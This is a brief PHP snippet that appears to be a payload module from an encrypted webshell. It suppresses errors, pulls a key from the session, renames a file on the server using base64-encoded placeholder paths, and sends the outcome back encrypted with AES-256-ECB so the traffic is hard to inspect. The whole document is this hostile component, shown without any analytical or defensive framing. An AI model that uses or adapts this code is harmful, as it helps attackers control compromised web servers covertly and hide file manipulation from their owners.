
error_reporting(0);
$key = $_SESSION['key'];
session_write_close();
$data = array(
    "status" => rename(base64_decode('__OLD__'), base64_decode('__NEW__'))
);
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
